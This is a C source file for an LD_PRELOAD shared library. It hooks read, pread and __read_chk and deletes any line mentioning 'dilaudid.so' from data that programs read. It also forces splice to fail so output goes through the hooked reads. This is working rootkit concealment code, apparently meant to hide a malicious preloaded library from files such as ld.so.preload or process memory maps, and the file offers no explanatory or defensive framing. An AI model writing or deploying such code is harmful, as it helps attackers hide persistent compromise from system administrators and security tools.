#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <dlfcn.h>
#include <errno.h>

#define TARGET_NEEDLE "dilaudid.so"
#define NEEDLE_LEN 11

/* --- 1. Core Parsing Logic --- */

static ssize_t filter_buffer(void *buf, ssize_t result) {
    if (result <= 0) return result;

    char *buf_start = (char *)buf;
    char *start = buf_start;

    // Boundary safe window scanning loop
    while (start < (buf_start + result)) {
        size_t remaining_bytes = (buf_start + result) - start;
        
        char *match = memmem(start, remaining_bytes, TARGET_NEEDLE, NEEDLE_LEN);
        if (!match) {
            break; 
        }

        char *end = buf_start + result;
        char *line_start = NULL;

        // Trace backward to the beginning of the text line
        if (match > buf_start) {
            line_start = memrchr(buf_start, '\n', match - buf_start);
        }
        line_start = line_start ? line_start + 1 : buf_start;

        // Trace forward to the end of the text line
        char *line_end = memchr(match, '\n', end - match);
        line_end = line_end ? line_end + 1 : end;

        size_t line_len = line_end - line_start;

        if (line_len > 0) {
            // Shift remaining memory down to completely omit the target line
            memmove(line_start, line_end, end - line_end);
            result -= line_len;
            start = buf_start; 
        } else {
            break;
        }
    }
    return result;
}

/* --- 2. Function Hooks --- */

// Modern utilities use splice() to transfer kernel data streams without copy buffers.
// Failing this call forces an explicit fallback to standard read loops.
ssize_t splice(int fd_in, off64_t *off_in, int fd_out, off64_t *off_out, size_t len, unsigned int flags) {
    errno = EINVAL;
    return -1;
}

ssize_t read(int fd, void *buf, size_t count) {
    static ssize_t (*real_read)(int, void *, size_t) = NULL;
    if (!real_read) real_read = dlsym(RTLD_NEXT, "read");

    ssize_t result = real_read(fd, buf, count);
    return filter_buffer(buf, result);
}

ssize_t pread(int fd, void *buf, size_t count, off_t offset) {
    static ssize_t (*real_pread)(int, void *, size_t, off_t) = NULL;
    if (!real_pread) real_pread = dlsym(RTLD_NEXT, "pread");

    ssize_t result = real_pread(fd, buf, count, offset);
    return filter_buffer(buf, result);
}

ssize_t __read_chk(int fd, void *buf, size_t nbytes, size_t buflen) {
    static ssize_t (*real_read_chk)(int, void *, size_t, size_t) = NULL;
    if (!real_read_chk) real_read_chk = dlsym(RTLD_NEXT, "__read_chk");

    ssize_t result = real_read_chk(fd, buf, nbytes, buflen);
    return filter_buffer(buf, result);
}
